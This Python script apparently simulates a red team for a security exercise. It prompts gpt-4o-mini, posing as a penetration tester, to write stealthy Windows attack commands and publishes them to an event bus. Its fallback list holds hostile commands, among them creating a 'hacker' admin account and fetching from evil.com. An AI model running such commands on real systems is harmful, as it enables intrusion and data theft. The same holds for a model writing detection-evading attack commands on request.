import os
import time
import json
from datetime import datetime
import sys
import random

sys.path.append('/app/shared')
from messaging import EventBus
from database import Database

# OpenAI設定
from openai import OpenAI
client = OpenAI(api_key=os.getenv('OPENAI_API_KEY'))

# 攻撃タイプ（ローテーション用）
ATTACK_TYPES = [
    {
        'type': '機密ファイルを探索',
        'examples': '*.pdf, *.xlsx, *.docx'
    },
    {
        'type': 'パスワードファイルを探す',
        'examples': 'password.txt, credentials.json'
    },
    {
        'type': '外部サーバーにデータを送信',
        'examples': 'Invoke-WebRequest, curl'
    },
    {
        'type': '新しい管理者アカウントを作成',
        'examples': 'net user, useradd'
    },
    {
        'type': '実行中のプロセスを調査',
        'examples': 'Get-Process, tasklist'
    },
    {
        'type': 'ネットワーク接続を確認',
        'examples': 'Get-NetTCPConnection, netstat'
    },
    {
        'type': 'データを圧縮してアーカイブ',
        'examples': 'Compress-Archive, zip'
    },
    {
        'type': 'システム情報を収集',
        'examples': 'systeminfo, Get-ComputerInfo'
    },
]

# フォールバック用
FALLBACK_COMMANDS = [
    'powershell.exe Get-ChildItem C:\\ -Recurse -Filter *.pdf',
    'cmd.exe /c dir C:\\Users /s /b | findstr password',
    'net user hacker P@ssw0rd /add',
    'powershell.exe Invoke-WebRequest http://evil.com/data.txt',
    'powershell.exe Get-Process | Sort-Object CPU -Descending',
    'powershell.exe Get-NetTCPConnection | Where-Object State -eq Established',
    'powershell.exe Compress-Archive -Path C:\\sensitive\\ -DestinationPath C:\\temp\\data.zip',
    'cmd.exe /c systeminfo | findstr /B /C:"OS"',
]

def generate_attack_command(attack_number):
    """GPT-4で攻撃コマンドを生成（多様性重視）"""
    
    # ランダムに攻撃タイプを選択
    attack_info = random.choice(ATTACK_TYPES)
    
    prompt = f"""あなたは侵入テストの専門家です。
学生アカウントを乗っ取った攻撃者として、
Windowsサーバーで「{attack_info['type']}」するコマンドを
1つ生成してください。

参考ツール: {attack_info['examples']}

条件:
- PowerShell または cmd.exe
- 実行可能な正しい構文
- 検知されにくいようにステルス性を重視
- 1行のみ（説明不要）

コマンドのみ出力:
"""
    
    try:
        print(f"💭 Asking GPT-4 to generate attack #{attack_number}...")
        print(f"   Attack type: {attack_info['type']}")
        
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=150,
            temperature=0.9  # ← 多様性を高める（0.7→0.9）
        )
        
        command = response.choices[0].message.content.strip()
        
        # コードブロックを除去
        if command.startswith('```'):
            lines = command.split('\n')
            command = '\n'.join([l for l in lines if not l.startswith('```')])
            command = command.strip()
        
        print(f"✅ GPT-4 generated:  {command[:60]}...")
        return command
        
    except Exception as e:
        print(f"⚠️ GPT-4 Error: {e}")
        print(f"   Using fallback command...")
        # ランダムにフォールバック選択
        return random.choice(FALLBACK_COMMANDS)

def main():
    print("🔴 Red Team Starting...")
    
    redis_url = os.getenv('REDIS_URL', 'redis://redis:6379')
    event_bus = EventBus(redis_url)
    
    db_url = os.getenv('DB_URL', 'postgresql://user:password@timescaledb:5432/sechack')
    db = Database(db_url)
    
    attack_number = 1
    
    while True:
        # 攻撃生成
        command = generate_attack_command(attack_number)
        
        # 攻撃データ作成
        attack_data = {
            'id': attack_number,
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'user': 'Student_A'
        }
        
        # Redisに送信
        event_bus.send_attack(attack_data)
        print(f"📤 Sent attack: {command[:80]}...")
        
        # データベースに保存
        db.save_attack(attack_data)
        print(f"💾 Saved to database: Attack #{attack_number}\n")
        
        attack_number += 1
        time.sleep(20)  # 20秒待機

if __name__ == '__main__':
    main()